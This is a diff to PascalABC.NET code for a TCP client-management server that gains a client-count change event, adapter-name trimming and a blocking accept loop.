@@ -26,10 +26,12 @@ type
     public _accept_service, _pp_service: Thread;
     public port: word;
     public selectedClient: TClient;
+    public clientsNumberChangedEvent: AutoResetEvent;
     
     /// Представляет конструктор по умолчанию для объекта
-    public constructor();
+    public constructor(changedEventHundler: AutoResetEvent);
     begin
+      self.clientsNumberChangedEvent := changedEventHundler;
       self.ipv4 := self.GetIPAddrs();
       self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
       self.listener := new TcpListener(IPAddress.Any, self.port);
@@ -37,6 +39,8 @@ type
       self._pp_service := new Thread(PPService);
     end;
     
+    procedure OnClientChanged := self.clientsNumberChangedEvent.Set();
+
     
     /// Возобновляет работу сервера и всех его сервисов
     public procedure Resume();
@@ -75,7 +79,10 @@ type
            LowerCase(adapter.Description).Contains('loopback') then
              continue;
            
-        res += adapter.Name;
+        if adapter.Name.Contains('[') then
+          res += adapter.Name.Substring(0, adapter.Name.IndexOf('['))
+        else
+          res += adapter.Name;
         
         var ipProps := adapter.GetIPProperties();
         
@@ -98,6 +105,7 @@ type
         self.tail := clnt;
       end;
       Inc(self.CountOfClients);
+      self.OnClientChanged();
     end;
     
     /// Удаляет одного клиента из очереди
@@ -136,6 +144,7 @@ type
         end;
       end;
       Dec(self.CountOfClients);
+      self.OnClientChanged();
     end;
     
     /// Удаляет одного клиента из очереди по его IP адресу
@@ -180,13 +189,12 @@ type
     begin
       AppIsRunning := false;
       
-      // Ждем завершения всех потоков
       foreach var service in [self._accept_service, self._pp_service] do
       begin
         if (service <> nil) and service.IsAlive then begin
-          service.Join(200); // Даем 200 млсек на завершение
+          service.Join(200);
           try
-            if service.IsAlive then service.Abort(); // Принудительное завершение, если не ответил
+            if service.IsAlive then service.Abort();
           except end;
         end;
       end;
@@ -210,14 +218,12 @@ type
     begin
       while self.AppIsRunning do
       begin
-        if self.listener.Pending then begin
-          var newTcpClient: TcpClient = self.listener.AcceptTcpClient();
-          if newTcpClient <> nil then begin
-            var ip := (newTcpClient.Client.RemoteEndPoint as IPEndPoint).Address;
-            var newClient := new TClient(ip.ToString(), self.port, newTcpClient);
-            newClient.WinInfo := JsonConvert.DeserializeObject&<WindowsInformation>(self.MessageHandler(GET_WIN_INFO, newClient));
-            AddClient(newClient);
-          end;
+        var newTcpClient: TcpClient = self.listener.AcceptTcpClient();
+        if newTcpClient <> nil then begin
+          var ip := (newTcpClient.Client.RemoteEndPoint as IPEndPoint).Address;
+          var newClient := new TClient(ip.ToString(), self.port, newTcpClient);
+          newClient.WinInfo := JsonConvert.DeserializeObject&<WindowsInformation>(self.MessageHandler(GET_WIN_INFO, newClient));
+          AddClient(newClient);
         end;
       end; // while
     end;
